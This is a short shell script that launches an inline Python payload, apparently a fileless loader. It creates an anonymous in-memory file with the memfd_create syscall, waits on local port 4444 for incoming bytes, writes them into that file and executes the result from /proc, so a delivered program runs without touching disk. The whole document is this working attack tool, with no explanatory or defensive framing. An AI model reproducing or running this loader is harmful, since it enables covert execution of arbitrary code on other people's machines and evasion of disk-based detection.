#!/bin/sh

python3 -c 'exec("import ctypes as c,os,socket as so;s=c.CDLL(None).syscall;s.argtypes=c.c_long,c.c_char_p,c.c_uint;n=c.ARRAY(c.c_char,0)();fd=s(319,n,1);s=so.socket();s.bind((\"127.0.0.1\",4444));s.listen(1);c,_=s.accept();\nwhile True:\n\td=c.recv(1024)\n\tif not d: break\n\tos.write(fd,d)\np=os.getpid();pa=\"/proc/{}/fd/{}\".format(p,fd);os.execve(pa,[pa],{})")'
